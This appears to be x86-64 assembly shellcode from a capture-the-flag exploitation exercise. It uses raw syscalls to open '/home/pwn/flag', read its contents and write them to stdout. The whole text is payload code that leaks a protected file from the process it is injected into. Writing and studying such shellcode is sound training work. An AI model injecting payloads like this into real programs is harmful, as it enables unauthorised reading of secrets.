	section .text
	global _start
_start:
	;; openat
	mov rbx, qword[rbp]
	add rbx, 0x1000
	mov qword[rbx], '/hom'
	mov qword[rbx+4], 'e/pw'
	mov qword[rbx+8], 'n/fl'
	mov qword[rbx+12], 'ag'
	mov qword[rbx+14], 0
	mov rax, 257
	mov rdi, 0
	mov rsi, rbx
	mov rdx, 0
	mov r10, 0
	syscall

	mov r10, rax

	;; read
	mov rax, 0
	mov rdi, r10
	mov rsi, rbx
	mov rdx, 0x40
	syscall

	;; write
	mov rdx, rax
	mov rax, 1
	mov rdi, 1
	mov rsi, rbx
	syscall
